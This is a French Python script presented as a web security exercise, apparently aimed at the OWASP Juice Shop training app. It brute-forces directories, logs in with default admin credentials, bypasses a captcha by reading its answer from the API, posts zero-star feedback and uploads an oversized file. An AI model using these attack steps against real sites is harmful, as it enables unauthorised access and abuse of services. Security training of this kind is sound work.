#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Script de test de sécurité web (exercice)
Usage: python3 scan_web.py -u https://monsite.com -w liste.txt
"""

import requests
import json
import argparse
import sys
import logging
from datetime import datetime

# --- Couleurs ---
RED     = '\033[0;31m'
GREEN   = '\033[0;32m'
YELLOW  = '\033[1;33m'
BLUE    = '\033[0;34m'
CYAN    = '\033[0;36m'
NC      = '\033[0m'

def cprint(couleur, message):
    print(f"{couleur}{message}{NC}")

# --- Logs ---
LOG_FILE = f"scan_web_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# --- Arguments ---
parser = argparse.ArgumentParser(description="Script de test de sécurité web")
parser.add_argument("-u", "--url",       required=True,            help="URL cible (ex: https://monsite.com)")
parser.add_argument("-w", "--wordlist",  default="liste.txt",      help="Fichier wordlist (défaut: liste.txt)")
parser.add_argument("-e", "--email",     default="admin@juice-sh.op", help="Email de connexion")
parser.add_argument("-p", "--password",  default="admin123",       help="Mot de passe")
parser.add_argument("--no-login",        action="store_true",      help="Désactiver login/avis/upload")
args = parser.parse_args()

SITE = args.url.rstrip("/")

cprint(BLUE, f"\n[+] Log enregistré dans : {LOG_FILE}")
cprint(BLUE, f"[+] Cible : {SITE}\n")
logger.info(f"Début du scan sur {SITE}")

# --- 1. Scan de dossiers ---
cprint(CYAN, f"[+] Scan de dossiers sur : {SITE}")
logger.info("Début du scan de dossiers")

try:
    with open(args.wordlist, "r") as f:
        dossiers = f.read().splitlines()
except FileNotFoundError:
    cprint(RED, f"[!] Wordlist introuvable : {args.wordlist}")
    logger.error(f"Wordlist introuvable : {args.wordlist}")
    sys.exit(1)

for dossier in dossiers:
    url = f"{SITE}/{dossier.lstrip('/')}"
    try:
        reponse = requests.get(url, timeout=5)
        if "Copyright" not in reponse.text:
            cprint(YELLOW, f"  [>] Dossier trouvé : {url} (HTTP {reponse.status_code})")
            logger.warning(f"Dossier trouvé : {url} (HTTP {reponse.status_code})")
        else:
            logger.info(f"Dossier non trouvé : {url}")
    except requests.RequestException as e:
        cprint(RED, f"  [!] Erreur sur {url} : {e}")
        logger.error(f"Erreur sur {url} : {e}")

# --- 2. Login / Avis / Upload ---
if args.no_login:
    cprint(BLUE, "\n[+] Partie login désactivée.")
    logger.info("Partie login désactivée par l'utilisateur.")
    sys.exit(0)

cprint(CYAN, f"\n[+] Tentative de login sur : {SITE}")
logger.info(f"Tentative de login avec {args.email}")
session = requests.Session()

login = session.post(
    f"{SITE}/rest/user/login",
    headers={"Content-Type": "application/json"},
    data=json.dumps({"email": args.email, "password": args.password}),
    timeout=5
)

if not login.ok:
    cprint(RED, "[!] Erreur login")
    logger.error("Échec du login")
    sys.exit(1)
else:
    cprint(GREEN, "[+] Login ok")
    logger.info("Login réussi")

# --- Captcha ---
pageavis = session.get(f"{SITE}/rest/captcha", timeout=5)
captchainfos = json.loads(pageavis.text)
captchaid = captchainfos["captchaId"]
captcharep = captchainfos["answer"]
logger.info(f"Captcha récupéré : id={captchaid}")

# --- Avis ---
avis = session.post(
    f"{SITE}/api/Feedbacks",
    headers={"Content-Type": "application/json"},
    data=json.dumps({"captchaId": captchaid, "captcha": captcharep, "comment": "lol", "rating": 0}),
    timeout=5
)
if avis.ok:
    cprint(GREEN, "[+] Publication avis ok")
    logger.info("Avis publié avec succès")
else:
    cprint(RED, "[!] Erreur publication avis")
    logger.error("Échec de la publication de l'avis")

# --- Upload fichier volumineux ---
with open("a_uploader.txt", "wb") as f:
    f.truncate(1024 * 151)

with open("a_uploader.txt", "rb") as f:
    upload = session.post(
        f"{SITE}/file-upload",
        files={"file": ("nom", f.read(), "application/json")},
        timeout=10
    )
if upload.ok:
    cprint(GREEN, "[+] Upload ok")
    logger.info("Upload réussi")
else:
    cprint(RED, "[!] Erreur upload")
    logger.error("Échec de l'upload")

logger.info("Fin du scan")
cprint(BLUE, f"\n[+] Scan terminé. Log disponible : {LOG_FILE}")
